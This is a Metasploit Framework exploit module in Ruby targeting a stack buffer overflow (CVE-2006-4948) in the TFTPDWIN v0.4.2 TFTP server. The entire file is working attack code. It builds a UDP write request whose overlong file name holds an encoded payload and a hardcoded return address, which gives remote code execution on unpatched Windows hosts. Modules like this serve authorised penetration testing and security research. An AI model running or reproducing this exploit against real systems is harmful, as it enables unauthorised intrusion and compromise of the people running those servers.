##
# $Id: tftpdwin_long_filename.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'TFTPDWIN v0.4.2 Long Filename Buffer Overflow\',
			\'Description\'    => %q{
					This module exploits the ProSysInfo TFTPDWIN threaded TFTP Server. By sending
				an overly long file name to the tftpd.exe server, the stack can be overwritten.
			},
			\'Author\' 	 => [ \'patrick\' ],
			\'Version\'        => \'$Revision: 9179 $\',
			\'References\'     =>
				[
					[ \'CVE\', \'2006-4948\' ],
					[ \'OSVDB\', \'29032\' ],
					[ \'BID\', \'20131\' ],
					[ \'URL\', \'http://www.milw0rm.com/exploits/3132\' ],
				],
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'process\',
				},
			\'Payload\'        =>
				{
					\'Space\'    => 284,
					\'BadChars\' => \"\\x00\",
					\'StackAdjustment\' => -3500,
				},
			\'Platform\'       => \'win\',
			\'Targets\'        =>
				[
					# Patrick - Tested OK 2007/10/02 w2ksp0, w2ksp4, xpsp0, xpsp2 en
					[ \'Universal - tftpd.exe\', { \'Ret\' => 0x00458b91 } ] # pop edx / ret tftpd.exe
				],
			\'Privileged\'     => false,
			\'DisclosureDate\' => \'Sep 21 2006\',
			\'DefaultTarget\'  => 0))

		register_options(
			[
				Opt::RPORT(69),
			], self)
	end

	def exploit
		connect_udp

		print_status(\"Trying target #{target.name}...\")
		sploit = \"\\x00\\x02\" + payload.encoded + [target[\'Ret\']].pack(\'V\')
		sploit << \"netascii\\x00\" # The first null byte is borrowed for the target return address :)
		udp_sock.put(sploit)

		disconnect_udp
	end

end
